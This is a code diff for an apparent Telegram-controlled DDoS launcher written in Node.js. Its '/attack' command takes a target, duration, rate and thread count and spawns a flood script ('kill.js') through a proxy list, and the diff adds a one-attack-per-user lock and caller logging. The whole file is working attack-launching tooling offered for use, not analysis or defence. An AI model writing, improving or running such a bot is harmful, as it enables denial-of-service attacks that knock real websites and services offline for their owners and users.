@@ -10,9 +10,10 @@ const bot = new TelegramBot(TOKEN, { polling: true })
 
 const app = express()
 const PORT = process.env.PORT || 3000
-
 app.get('/', (req, res) => res.send('Bot is running'))
 app.listen(PORT, () => console.log(`Listening on port ${PORT}`))
+
+const activeAttacks = {}
 
 bot.onText(/\/system/, async (msg) => {
   const chatId = msg.chat.id
@@ -38,11 +39,11 @@ bot.on('message', (msg) => {
   const id = msg.chat.id
   const text = msg.text?.trim()
   const userId = msg.from.id
-  const username = msg.chat.username
+  const username = msg.chat.username || msg.from.username || 'unknown'
 
   if (!text) return
 
-  const isFromAllowedGroup = msg.chat.type === 'supergroup' && username === GROUP_USERNAME
+  const isFromAllowedGroup = msg.chat.type === 'supergroup' && msg.chat.username === GROUP_USERNAME
   const isAdmin = ADMIN_IDS.includes(userId)
 
   if (!isFromAllowedGroup && !isAdmin) return
@@ -51,6 +52,11 @@ bot.on('message', (msg) => {
     const args = text.split(/\s+/).slice(1)
     if (args.length !== 4) {
       bot.sendMessage(id, '```json\n' + JSON.stringify({ error: "/attack [target] [time] [rate] [thread]" }, null, 2) + '\n```', { parse_mode: 'Markdown' })
+      return
+    }
+
+    if (activeAttacks[userId]) {
+      bot.sendMessage(id, '```json\n' + JSON.stringify({ error: "Bạn đang có cuộc tấn công đang chạy, vui lòng chờ kết thúc!" }, null, 2) + '\n```', { parse_mode: 'Markdown' })
       return
     }
 
@@ -68,14 +74,17 @@ bot.on('message', (msg) => {
     }
 
     try {
+      activeAttacks[userId] = true
       const cmd = spawn('node', ['./kill.js', target, time, rate, thread, './prx.txt'])
       const response = {
         status: "Attack Started!",
         target,
         time,
         rate,
-        thread
+        thread,
+        caller: username
       }
+
       bot.sendMessage(id, '```json\n' + JSON.stringify(response, null, 2) + '\n```', {
         parse_mode: 'Markdown',
         reply_markup: {
@@ -91,13 +100,16 @@ bot.on('message', (msg) => {
       })
 
       cmd.on('error', (err) => {
+        delete activeAttacks[userId]
         bot.sendMessage(id, '```json\n' + JSON.stringify({ error: err.message }, null, 2) + '\n```', { parse_mode: 'Markdown' })
       })
 
       cmd.on('close', (code) => {
+        delete activeAttacks[userId]
         bot.sendMessage(id, '```json\n' + JSON.stringify({ done: true, code }, null, 2) + '\n```', { parse_mode: 'Markdown' })
       })
     } catch (err) {
+      delete activeAttacks[userId]
       bot.sendMessage(id, '```json\n' + JSON.stringify({ error: err.message }, null, 2) + '\n```', { parse_mode: 'Markdown' })
     }
   }
